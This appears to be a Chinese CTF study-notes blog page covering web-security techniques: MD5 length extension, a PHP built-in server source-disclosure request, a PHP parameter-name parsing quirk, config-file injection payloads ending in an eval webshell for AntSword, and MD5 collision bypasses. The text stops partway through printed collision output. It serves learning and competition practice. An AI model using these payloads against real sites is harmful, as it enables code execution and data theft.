<p><a data-fancybox="gallery" data-src="/Notes/image-20230904224135156.png"><img src="/Notes/image-20230904224135156.png" alt="image-20230904224135156"></a></p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904223823110.png"><img src="/Notes/image-20230904223823110.png" alt="image-20230904223823110"></a></p>
<p>总共可以分为，</p>
<blockquote>
<ol>
<li>把消息分为n个分组</li>
<li>对最后一个消息分组进行填充</li>
<li>和输入量进行运算，运算结果位下一个分组的输入量</li>
<li>输出最终结果</li>
</ol>
</blockquote>
<p>MD5算法输入的消息以<code>512bit</code>的分组为单位处理，共<code>64byte</code></p>
<p>然后对每个分组进行加密，前一次的加密的结果会作为这一次加密的输入，最后一次加密的结果即为最终的MD5值。</p>
<p><code>不足64字节的分组</code>需要进行<code>补位</code>，也就是字节填充。</p>
<blockquote>
<p>补位原则：首先将需要hash的字符串进行分组，即<code>字符串长度</code>（以字节为单位）整除64，最后一组<code>不足56字节</code>的进行字节填充。填充的第一个字节为<code>0x80</code>，其他均为<code>0x00</code>。剩下的<code>8个字节</code>(64bit)用来表示原字符串的长度。</p>
</blockquote>
<hr>
<p>拿<code>*CTF 2023 jwt2struts</code>题目为例</p>
<blockquote>
<p>$_COOKIE[“digest”] 要求为 md5($salt.$username.$password)<br>要满足$username &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $password !&#x3D; “root”<br>&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters<br>&#x2F;&#x2F;md5($salt.”adminroot”)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df</p>
</blockquote>
<p>这个是提示，发现我们知道了<code>md5($salt.&quot;adminroot&quot;)</code>的值，也就是我们的目的MD5值，再加上我们想要加密的字符串，<code>salt的长度已知</code>，后段的<code>adminroot</code>已知</p>
<p>符合情形，</p>
<blockquote>
<ol>
<li>已知需要加密的字段（如，已知adminroot）</li>
<li>已知salt的长度，但不知道具体值</li>
</ol>
</blockquote>
<p>可以直接用工具<code>hashdump</code>即可</p>
<h1 id="php"><a href="#php" class="headerlink" title="php&lt;&#x3D;7.4.21 内置服务器任意文件读取"></a>php&lt;&#x3D;7.4.21 内置服务器任意文件读取</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p>
</blockquote>
<p>羊城杯遇到的知识点，在<code>php&lt; = 7.4.21</code>任意文件读取</p>
<p>开始看到这个页面其实很陌生</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904170556437.png"><img src="/Notes/image-20230904170556437.png" alt="image-20230904170556437"></a></p>
<p>和常见的<code>apache</code>以及<code>nginx</code>的404都不一样</p>
<p>搜了一下发现是php内置服务器搭建的网站</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904205656790.png"><img src="/Notes/image-20230904205656790.png" alt="image-20230904205656790"></a></p>
<blockquote>
<p>ps.后面看其他人wp才知道，可以扫描网站的，怕被封号没扫，网站下有个<code>start.sh</code>，里面就给出了网站的<code>启动命令</code>和<code>flag</code>的位置，结果我还取解密看重定向响应，麻了</p>
</blockquote>
<p>当然题目是反序列化读文件，但是我们得先读取到源码内容，</p>
<p>网站中想要读取php的源码一般是<code>rce</code>和<code>文件包含</code>才能得到，但是题目只给了<code>404</code>页面，以及有个待读取源码的<code>p0p.php</code>文件</p>
<p>利用php内置服务器而不靠中间件搭建的网站，真的安全吗？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>

<p>利用万能ai给出文章网站</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904171442398.png"><img src="/Notes/image-20230904171442398.png" alt="image-20230904171442398"></a></p>
<p>在php&lt;&#x3D;7.4.21版本中，利用php内置服务器搭建的网站存在任意文件读取，但也只是只能读取该命令执行所在目录下的文件，不过正好可以读出<code>p0p.php</code>的内容</p>
<p>但是题目关了，知识点，我在<code>wsl</code>复现一下</p>
<hr>
<blockquote>
<p>环境：</p>
<p><code>wsl2 系统kali</code></p>
<p><code>php版本 7.0.33</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174618539.png"><img src="/Notes/image-20230904174618539.png" alt="image-20230904174618539"></a></p>
<p>我在命令启动的目录下生成了一个<code>flag.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag&#123;test&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag_is_here&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常访问只能看到<code>flag_is_here</code></p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174602793.png"><img src="/Notes/image-20230904174602793.png" alt="image-20230904174602793"></a></p>
<p>但是看不到<code>flag&#123;test&#125;</code></p>
<p>但是通过构造特殊结构的请求体就可以访问成功，</p>
<blockquote>
<p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 172.28.31.86:8888</p>
<p>GET &#x2F; HTTP&#x2F;1.1</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904174755615.png"><img src="/Notes/image-20230904174755615.png" alt="image-20230904174755615"></a></p>
<p>发现<code>flag.php</code>的内容被完全显示出来，而服务器中的访问数据只是访问了首页</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20230904175028098.png"><img src="/Notes/image-20230904175028098.png" alt="image-20230904175028098"></a></p>
<blockquote>
<p>原理有点绕，可以看看<code>7.4.21</code>和<code>7.4.22</code>的区别分析一下</p>
</blockquote>
<h2 id="7-4-21"><a href="#7-4-21" class="headerlink" title="7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现"></a>7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现</h2><p>当然并不是高版本就不行了，，其实高版本也存在这个漏洞</p>
<p>在低于<code>8.0.2</code>版本的<code>php</code>，如果想要复现这个漏洞需要满足一个条件，就是命令执行所在的目录下必须没有<code>index.php</code>文件才可以实现</p>
<h3 id="低版本有index-php情况"><a href="#低版本有index-php情况" class="headerlink" title="低版本有index.php情况"></a>低版本有<code>index.php</code>情况</h3><p>我们先在<code>7.0.33</code>版本下生成一个<code>index.php</code>文件，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;welcome index!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20230904180249243.png"><img src="/Notes/image-20230904180249243.png" alt="image-20230904180249243"></a></p>
<p>发现在低版本下如果在目录执行的目录下有<code>index.php</code>，也无法进行任意文件内容的读取</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>想要实现php内置服务器任意文件读取，首先是要满足版本要求，其次需要满足，对方执行搭建内置服务器的目录下没有index.php文件，才可以实现任意文件内容的一个读取，不过一般的开发者都不会把php内置服务器搭建的网站挂在公网上，不过这个漏洞也是一个值得考虑的一个利用点</p>
</blockquote>
<h1 id="php-8非法参数名传参"><a href="#php-8非法参数名传参" class="headerlink" title="php &lt; 8非法参数名传参"></a>php &lt; 8非法参数名传参</h1><p>当传参<code>$_REQUEST[&#39;mo chu.&#39;]</code></p>
<p>参数名中含有<code>空格</code>和<code>点</code>，可以看到当我们传入<code>?mo chu. =xxx</code>时，传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code>，这样的参数名确实无法传参。</p>
<p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code>。</p>
<p>Payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mo[chu.<span class="number">7</span>=xxx</span><br></pre></td></tr></table></figure>

<p>利用了如果传入的参数名出现了中括号<code>[</code>只替换一次的原理，使得传入的参数为：<code>mo_chu.7</code></p>
<p>但是如果出现了多个 <code>[</code>，就无法替换了</p>
<p>在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线</p>
<h1 id="PHP写入配置文件的经典漏洞"><a href="#PHP写入配置文件的经典漏洞" class="headerlink" title="PHP写入配置文件的经典漏洞"></a>PHP写入配置文件的经典漏洞</h1><p>在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含</p>
<p><a target="_blank" rel="noopener" href="https://bbs.zkaq.cn/t/6045.html">转载文章</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line">`<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>])) <span class="keyword">die</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;option&#x27;</span>]);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>);`</span><br><span class="line">`<span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;|\$option=\&#x27;.*\&#x27;;|&#x27;</span>, <span class="string">&quot;\$option=&#x27;<span class="subst">$str</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);`</span><br><span class="line">`<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./config.php&#x27;</span>, <span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>


<p><code>config.php</code> 的内容如下:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>要求是要<code>getshell</code>,这个场景十分经典，常用在修改配置文件写入的时候。<br>此处不存在之前说的那个配置文件中用的是<code>”双引号”</code>引起任意代码执行的问题,这这里面用的是单引号,而且 <code>addslashes()</code>处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.</p>
<h2 id="方法一-利用换行符来绕过正则匹配的问题"><a href="#方法一-利用换行符来绕过正则匹配的问题" class="headerlink" title="方法一,利用换行符来绕过正则匹配的问题"></a>方法一,利用换行符来绕过正则匹配的问题</h2><p>可以看到正则匹配的是以下内容:</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$optio</span>n=<span class="string">&#x27;任意内容&#x27;</span></span><br></pre></td></tr></table></figure>


<p>任意内容里面是可以包含转移符 <code>\</code> 的,所以我们利用下面的方法:</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>执行完第一个之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\&#x27;;</span></span><br><span class="line"><span class="string">phpinfo();//&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>但是这样并没有办法执行<code>phpinfo()</code>,因为我们插入的 单引号 被转移掉了,所以<code>phpinfo()</code>还是在单引号的包裹之内.<br>我们在访问下面这个</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure>


<p>因为正则 <code>.*</code> 会匹配行内的任意字符无数次.所以 <code>\</code> 也被认为是其中的一部分,也会被替换掉,执行完之后,<code>config.php</code>中的内容为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>


<p>转义符就被替换掉了,就成功的<code>getshell</code>.</p>
<h2 id="方法二-利用-preg-replace函数的问题"><a href="#方法二-利用-preg-replace函数的问题" class="headerlink" title="方法二,利用 preg_replace函数的问题:"></a>方法二,利用 preg_replace函数的问题:</h2><p>用<code>preg_replace()</code>的时候<code>replacement(第二个参数)</code>也要经过正则引擎处理，所以正则引擎把<code>\\</code>转义成了<code>\</code><br>也就是说如果字符串是<code>\\\&amp;#39;</code>,经过 <code>preg_replace()</code>的处理,就变为 <code>#39;</code>,单引号就逃出来了.<br>所以<code>payload</code>如下:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/index.php?option=a\&#x27;;phpinfo();/</span>/</span><br></pre></td></tr></table></figure>


<p><code>config.php</code>变为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;a\\&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>**道理就是  <code>a\&amp;#39;;phpinfo();//</code>  经过 <code>addslashes()</code>处理之后,变为<code>a\\\&amp;#39;;phpinfo();//</code> 然后两个反斜杠被<code>preg_replace</code>变成了一个,导致单引号逃脱.</p>
<h2 id="方法三-利用-preg-replace-函数的第二个参数的问题"><a href="#方法三-利用-preg-replace-函数的第二个参数的问题" class="headerlink" title="方法三, 利用 preg_replace() 函数的第二个参数的问题"></a>方法三, 利用 preg_replace() 函数的第二个参数的问题</h2><p>先看官方对<code>preg_replace()</code>函数的描述<code>manual</code><br>函数原型:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xed <span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br></pre></td></tr></table></figure>


<p>对<code>replacement</code>的描述.<br><code>replacement</code>中可以包含后</p>
<p>向<code>引用\\n或(php 4.0.4以上可用)$n</code>，语法上首选后者。 每个 这样的引用将被匹配到的第<code>n</code>个捕获子组捕获到的文本替换。 <code>n</code> 可以是<code>0-99</code>，<code>\\0</code>和<code>$0</code>代表完整的模式匹配文本。</p>
<p>所以我们可以用:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=;phpinfo();</span><br><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option= 或者 http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/test/</span>ph.php?option=<span class="variable">$0</span></span><br></pre></td></tr></table></figure>


<p>执行第一条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;;phpinfo();&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>再执行第二条后<code>config.php</code>的内容为:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$option</span>=<span class="string">&#x27;$option=&#x27;</span>;<span class="title function_ invoke__">phpinfo</span>();<span class="string">&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>


<p>刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.</p>
<hr>
<p>要<code>getshell</code>直接</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把<span class="built_in">phpinfo</span>()替换成</span><br><span class="line"><span class="function"><span class="title">eval</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line"><span class="function"><span class="title">assert</span><span class="params">($_REQUEST[<span class="number">123</span>])</span></span></span><br><span class="line">蚁剑连接即可</span><br></pre></td></tr></table></figure>

<h1 id="MD5强类型比较"><a href="#MD5强类型比较" class="headerlink" title="MD5强类型比较"></a>MD5强类型比较</h1><p><a target="_blank" rel="noopener" href="https://www.hetianlab.com/specialized/20210207105730">https://www.hetianlab.com/specialized/20210207105730</a></p>
<h2 id="比较"><a href="#比较" class="headerlink" title="&#x3D;&#x3D;&#x3D;比较"></a>&#x3D;&#x3D;&#x3D;比较</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h2><p>也可以传入两个数组，但不再适合传入两个0e开头的字符串，因为&#x3D;&#x3D;&#x3D;是md5的强碰撞，进行了严格的过滤。</p>
<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212111331.png"><img src="/Notes/image-20240113212111331.png" alt="image-20240113212111331"></a></p>
<h2 id="解法2："><a href="#解法2：" class="headerlink" title="解法2："></a>解法2：</h2><p>使用md5加密后两个完全相等的两个字符串来绕过过滤。</p>
<p>如何生成两个不一样的字符串，但是MD5是一样的呢。参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2232">如何用不同的数值构建一样的MD5</a>后，我们可以使用快速MD5碰撞生成器来构建两个MD5一样，但内容完全不一样的字符串。</p>
<p><a target="_blank" rel="noopener" href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">fastcoll_v1.0.0.5.exe.zip</a></p>
<h3 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h3><p>创建一个文本文件，写入任意的文件内容，命名为ywj.txt （源文件）</p>
<p>运行fastcoll输出以下参数。-p 是源文件，-o是输出文件</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcoll_v1</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -p ywj.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Notes/image-20240113212048880.png"><img src="/Notes/image-20240113212048880.png" alt="image-20240113212048880"></a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对生产的1.txt和2.txt文件进行测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. <span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.<span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">二进制md5加密 <span class="number">8e4</span>ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>EF%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span class="number">0</span>F%C8t%F28%FAU%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9b4%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">9</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CFNB%E7%EF%B0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二进制md5加密 <span class="number">8e4</span>ef6c69a337c0de0208455ee69a416</span><br><span class="line"></span><br><span class="line">url编码 <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>E%C6%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span 